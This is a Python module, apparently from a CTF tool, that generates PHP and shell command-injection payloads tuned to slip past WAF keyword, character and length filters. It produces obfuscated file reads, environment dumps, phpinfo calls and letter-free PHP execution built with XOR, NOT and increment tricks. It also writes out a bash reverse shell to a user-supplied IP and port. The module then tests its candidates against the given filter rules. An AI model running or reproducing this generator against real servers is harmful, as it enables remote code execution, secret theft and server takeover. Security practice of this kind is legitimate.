from dataclasses import dataclass

from . import bypass_data
from . import utils


@dataclass
class BypassOptions:
    flagfile: str
    read_env: bool
    reflect_shell: bool
    ip: str
    port: int
    phpinfo: bool
    php_version: float = 7.0


def _octal_encode(command: str):
    """
    八进制
    """
    encoded = "".join(f"\\{oct(ord(c))[2:]}" for c in command)
    return f"$'{encoded}'"


def _wildcard_bypass(path: str):
    """
    通配符
    """
    if not path or path == "/":
        return path
    parts = path.split("/")
    new_parts = []
    for p in parts:
        if len(p) > 1:
            new_parts.append(p[0] + "?" * (len(p) - 1))
        else:
            new_parts.append(p)
    return "/".join(new_parts)


def _base64_pipe_bypass(command: str):
    """
    变量拆分
    """
    import base64

    b64_cmd = base64.b64encode(command.encode()).decode()

    assign_base64, concat_base64 = utils._split_string_to_vars("base64")
    assign_sh, concat_sh = utils._split_string_to_vars("sh")

    assign_echo, concat_echo = utils._split_string_to_vars("echo")

    payload = f"{assign_base64}{assign_sh}{assign_echo} {concat_echo} {b64_cmd}| {concat_base64} -d| {concat_sh}"

    return payload


def _generate_php_rce_payloads(command: str, php_version: float):
    """
    生成无字母数字
    """
    payloads = []

    for template in bypass_data.BACKTICK_TEMPLATES:
        if "{path}" in template:
            pass
        else:
            payloads.append(template.replace("{path}", command))

    payloads.append(f"`{command}`")

    wrappers = bypass_data.PHP_EXEC_WRAPPERS

    for func in wrappers:
        # 适用于 php7.0
        if php_version >= 7.0:
            not_func = utils.generate_php_not(func)
            not_arg = utils.generate_php_not(command)
            if not_func and not_arg:
                payloads.append(f"{not_func}({not_arg});")

        # 异或构造
        xor_func = utils.generate_php_xor(func)
        xor_arg = utils.generate_php_xor(command)
        if xor_func and xor_arg:
            # $_=...; $_(...);
            var_func = "$_"
            payloads.append(f"{var_func}={xor_func};{var_func}({xor_arg});")

        # 自增
        inc_func_code = utils.generate_php_increment(func)
        inc_arg_code = utils.generate_php_increment(command)

        if inc_func_code and inc_arg_code:
            if xor_arg:
                payloads.append(f"{inc_func_code};$_____({xor_arg});")

    return payloads


def _append_upload_exec_payloads(payloads):
    # 最终验证包装
    payloads.extend(bypass_data.UPLOAD_EXEC_TEMPLATES)
    for cmd in bypass_data.UPLOAD_EXEC_TEMPLATES:
        for wrapper in bypass_data.UPLOAD_EXEC_WRAPPER_TEMPLATES:
            payloads.append(wrapper.format(cmd=cmd))


def generate_candidates(options: BypassOptions):
    payloads = []

    # 收集用于命令执行生成的目标命令
    target_cmd = None
    if options.flagfile:
        target_cmd = f"cat {options.flagfile}"

        for template in bypass_data.READFILE_TEMPLATES:
            # 原始路径
            payloads.append(template.format(path=options.flagfile, keyword="flag"))
            # 通配符路径
            payloads.append(template.format(path=_wildcard_bypass(options.flagfile), keyword="flag"))
            # 转义路径
            payloads.append(template.format(path=utils.obfuscate_filename_escape(options.flagfile), keyword="flag"))
            # 引号路径
            payloads.append(template.format(path=utils.obfuscate_filename_quotes(options.flagfile), keyword="flag"))

        # 反引号 ``
        for template in bypass_data.BACKTICK_TEMPLATES:
            payloads.append(template.format(path=options.flagfile))

        # 包含 include
        for template in bypass_data.INCLUDE_TEMPLATES:
            payloads.append(template.format(path=options.flagfile))

        # 文件枚举
        payloads.extend(bypass_data.FILE_ENUM_TEMPLATES)

    if options.read_env:
        payloads.extend(bypass_data.READ_ENV_TEMPLATES)

        # 嵌套目录枚举
        payloads.extend(bypass_data.DIRECTORY_ENUM_TEMPLATES)

        _append_upload_exec_payloads(payloads)

        # 日志包含
        payloads.extend(bypass_data.LOG_INCLUSION_TEMPLATES)
        target_cmd = "env"

    if options.reflect_shell:
        for template in bypass_data.REFLECT_SHELL_TEMPLATES:
            payloads.append(template.format(ip=options.ip, port=options.port))

        _append_upload_exec_payloads(payloads)

        # 反弹shell

        shell_cmd = f"bash -c 'bash -i >& /dev/tcp/{options.ip}/{options.port} 0>&1'"
        for template in bypass_data.WEBSHELL_TEMPLATES:
            payloads.append(template.format(cmd=shell_cmd))

        target_cmd = shell_cmd

    if options.phpinfo:
        for template in bypass_data.PHPINFO_TEMPLATES:
            if template.startswith("(") and template.endswith(");"):
                # 对php版本进行判断
                if options.php_version < 7.0:
                    continue
            payloads.append(template)
        target_cmd = "phpinfo" 

    # Header 链利用
    if options.read_env or options.phpinfo:
        payloads.extend(bypass_data.HEADER_EXEC_TEMPLATES)

    # 变量劫持
    if options.reflect_shell or options.phpinfo:
        payloads.extend(bypass_data.VARIABLE_HIJACK_TEMPLATES)

    if target_cmd:
        if target_cmd == "phpinfo":
            # 自增
            inc_code = utils.generate_php_increment("phpinfo")
            if inc_code:
                payloads.append(f"{inc_code};$_____();")

            if options.php_version >= 7.0:
                not_code = utils.generate_php_not("phpinfo")
                payloads.append(f"{not_code}();")
        else:
            rce_payloads = _generate_php_rce_payloads(target_cmd, options.php_version)
            payloads.extend(rce_payloads)

    current_payloads = payloads.copy()
    for p in current_payloads:
        if ";" in p or "(" in p or "$_" in p:
            for tag_tmpl in bypass_data.SHORT_TAG_TEMPLATES:
                payloads.append(tag_tmpl.format(payload=p))

    # 对当前已生成载荷应用编码管道绕过
    base_payloads = payloads.copy()
    for p in base_payloads:
        # 仅作用于命令字符串
        if ";" not in p and "(" not in p:
            payloads.append(_base64_pipe_bypass(p))

    # 八进制编码
    simple_cmds = ["ls", "cat /flag", "tac /flag", "env"]
    for cmd in simple_cmds:
        payloads.append(_octal_encode(cmd))

    # 空格 bypass
    candidates = payloads.copy()
    for p in payloads:
        if " " in p:
            for template in bypass_data.SPACE_BYPASS_TEMPLATES:
                candidates.append(template.format(payload=p))

    return utils.dedupe_preserve_order(candidates)


def apply_encodings(payloads, strategies):
    encoded = []
    for payload in payloads:
        for _name, encoder in strategies:
            try:
                encoded.append(encoder(payload))
            except Exception:
                continue
    return utils.dedupe_preserve_order(encoded)


def filter_payloads(
    payloads,
    waf_words,
    waf_chars,
    waf_regex,
    limit_length,
    show_progress=True,
    verbose=False,
):
    passed = []
    progress = ProgressBar(len(payloads), verbose=verbose) if show_progress else None
    for idx, payload in enumerate(payloads, start=1):
        if progress:
            progress.update(idx)
        if utils.is_payload_allowed(payload, waf_words, waf_chars, waf_regex, limit_length):
            passed.append(payload)
            if progress:
                progress.mark_pass(payload)
    if progress:
        progress.finish()
    return passed


class ProgressBar:
    def __init__(self, total, width=24, stream=None, verbose=False):
        self.total = max(int(total), 0)
        self.width = max(int(width), 5)
        self.stream = stream
        self.current = 0
        self.passed = 0
        self.verbose = verbose

    def update(self, current):
        self.current = current
        self._write_line()

    def mark_pass(self, payload):
        self.passed += 1
        if self.verbose:
            self._write_line(end="\n")
            self._write(f"PASS: {payload}\n")
        else:
            self._write_line()

    def finish(self):
        self.current = self.total
        self._write_line(end="\n")

    def _write_line(self, end=""):
        bar = self._render_bar()
        msg = f"\r{bar} {self.current}/{self.total} passed:{self.passed}"
        self._write(msg + end)

    def _render_bar(self):
        if self.total <= 0:
            filled = 0
        else:
            filled = int(self.width * (self.current / self.total))
        return "[" + ("=" * filled).ljust(self.width, ".") + "]"

    def _write(self, text):
        import sys

        stream = self.stream or sys.stdout
        stream.write(text)
        stream.flush()
